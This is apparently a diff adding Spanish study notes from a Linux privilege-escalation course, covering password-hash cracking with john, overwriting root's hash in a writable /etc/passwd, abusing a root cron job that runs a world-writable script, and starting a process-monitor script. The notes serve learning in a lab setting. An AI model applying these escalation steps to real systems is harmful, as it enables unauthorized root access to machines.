@@ -1,3 +1,5 @@
+# video 8
+
 //saber quien soy
 whoami
 
@@ -44,4 +46,83 @@ john --wordlists=/usr/share/wordlists/rockyou.txt hash
 
 Si concuerda el algoritmo de encriptacion que es compatibles con john, empezara a comparar el hash con los que va generar john mediante la lista de constraseñas usuales.
 
+
+Otra cosas que debemos de tener muy encuenta son los permisos que debemos darle a nuestro ficheros
+
+Una mala configuracion  nos la cuelan.
+
+desde un usuario "pepito" , si tengo permisos de escritura en /etc/passwd
+
+find /etc/ \-writable 2>/dev/null
+
+-> /etc/passwd
+
+openssl passwd -> crear contraseña
+
+hash-identifier -> identificar tipo de cifrado
+hashid -> 
+
+con capacidad de escritura 
+
+nano /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+root:hash-generado-openssl:0:0:root:/root:/bin/bash
+
+su root -> entramos con el usuario root y comprobará el hash
+con el que hay en el fichero /etc/passwd no /etc/shadow
+
+
+
+# video 9 Explotación de tareas cron
+cd /etc/cron.d
+
+service cron status
+
+//antes de iniciarlo creamos una tareas cron
+
+nano tarea
+
+//cada minuto se esta ejecutando esta tarea
+* * * * * root /home/s4vitar/Desktop/file.sh
+
+cd /home/s4vitar/Desktop/file.sh
+
+nano file.sh
+
+sleep 10
+#borra todo los ficheros temporales
+rm -r /tmp/*
+
+
+//ahora partiendo de una usuario no privilegios -> convertirnos en root
+
+
+chmod o+w file.sh
+
+
+
+
+# video 10 detección de tareas cron a traves de un script
+
+comprobamos nuestros privilegios/permisos en linux
+
+whoami
+id
+sudo su
+uname -a
+lsb_realease -a
+
+//no iriamos a ficheros con suid, que tengan capacidad de escritura por parte de mi usuario
+
+el objetivo es crear un programa en bash para ver las tareas que
+se estan ejecutando en tiempo real
+
+touch procmon.sh
+chmod +x !$ -> permisos de ejecucion
+nano !$
+
+con la ayuda del comando ps -eo command
+
+#!/bin/bash -> cabeceras
 
